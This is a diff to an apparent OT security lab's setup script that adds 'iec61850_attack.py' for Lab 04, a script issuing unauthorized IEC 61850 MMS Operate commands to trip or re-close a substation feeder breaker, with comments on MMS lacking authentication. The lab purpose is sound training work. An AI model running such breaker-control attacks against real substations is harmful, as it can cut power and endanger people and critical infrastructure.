@@ -862,12 +862,70 @@ PYEOF
 
 chmod +x /root/Desktop/Attack_Scripts/dnp3_attack.py
 
+# ── iec61850_attack.py ──────────────────────────────────────────────────────────
+# Lab 04: Unauthorized IEC 61850 MMS control operate against a substation IED.
+# Sends the same client Operate service request a legitimate engineering
+# workstation would send to trip/close XCBR1 (the feeder breaker) — but from
+# an unauthorized network location. The MMS profile served here has no
+# built-in authentication (IEC 62351-8/-4 exists but is rarely deployed in the
+# field), so any host that can reach TCP 102 can issue this command.
+#
+# Unlike dnp3_attack.py above, this script does not reimplement the protocol
+# in pure Python — MMS is a full ISO stack (ACSE/Presentation/Session on top
+# of BER-encoded ASN.1), not a reasonable one-file hand-rolled implementation.
+# It shells out to /opt/otforge/iec61850-client, a small C client built
+# against libiec61850 (the same library the otforge-iec61850 IED server uses).
+cat > /root/Desktop/Attack_Scripts/iec61850_attack.py << 'PYEOF'
+#!/usr/bin/env python3
+"""
+iec61850_attack.py — Unauthorized IEC 61850 MMS control operate against a
+substation IED's XCBR1 (feeder breaker).
+
+Usage:
+    python3 iec61850_attack.py <ied-ip> [--close]
+
+Examples:
+    python3 iec61850_attack.py 10.200.10.12            # trip the breaker (open)
+    python3 iec61850_attack.py 10.200.10.12 --close    # re-close the breaker
+"""
+
+import argparse
+import subprocess
+import sys
+
+CLIENT_BIN = "/opt/otforge/iec61850-client"
+
+
+def main():
+    parser = argparse.ArgumentParser(
+        description="IEC 61850 MMS control attack against XCBR1.Pos (feeder breaker)"
+    )
+    parser.add_argument("host", help="IP address of the IEC 61850 IED (MMS server, TCP 102)")
+    parser.add_argument("--close", action="store_true",
+                        help="Close the breaker instead of opening/tripping it")
+    args = parser.parse_args()
+
+    mode = "close" if args.close else "open"
+    print(f"[iec61850-attack] Connecting to {args.host}:102 (MMS) ...")
+    print(f"[iec61850-attack] Sending unauthorized Operate: XCBR1.Pos -> {mode.upper()}")
+
+    result = subprocess.run([CLIENT_BIN, args.host, mode])
+    sys.exit(result.returncode)
+
+
+if __name__ == "__main__":
+    main()
+PYEOF
+
+chmod +x /root/Desktop/Attack_Scripts/iec61850_attack.py
+
 echo "[otforge-attack] Attack_Scripts created:"
-echo "[otforge-attack]   /root/Desktop/Attack_Scripts/read_coils.py    — read coil + register state (one-shot)"
-echo "[otforge-attack]   /root/Desktop/Attack_Scripts/write_coil.py    — coil write attack (--restore to undo)"
-echo "[otforge-attack]   /root/Desktop/Attack_Scripts/plc_init.py      — re-seed PLC baseline (inlet pump=ON, outlet valve=OPEN)"
-echo "[otforge-attack]   /root/Desktop/Attack_Scripts/monitor_level.py — live tank-level bar (--fast for 0.5 s poll)"
-echo "[otforge-attack]   /root/Desktop/Attack_Scripts/dnp3_attack.py   — DNP3 Direct Operate attack (Lab 03)"
+echo "[otforge-attack]   /root/Desktop/Attack_Scripts/read_coils.py      — read coil + register state (one-shot)"
+echo "[otforge-attack]   /root/Desktop/Attack_Scripts/write_coil.py      — coil write attack (--restore to undo)"
+echo "[otforge-attack]   /root/Desktop/Attack_Scripts/plc_init.py        — re-seed PLC baseline (inlet pump=ON, outlet valve=OPEN)"
+echo "[otforge-attack]   /root/Desktop/Attack_Scripts/monitor_level.py   — live tank-level bar (--fast for 0.5 s poll)"
+echo "[otforge-attack]   /root/Desktop/Attack_Scripts/dnp3_attack.py     — DNP3 Direct Operate attack (Lab 03)"
+echo "[otforge-attack]   /root/Desktop/Attack_Scripts/iec61850_attack.py — IEC 61850 MMS breaker control attack (Lab 04)"
 
 # ── PLC Modbus baseline initialization ────────────────────────────────────────
 # Runs in the background so VNC/noVNC startup is not delayed.
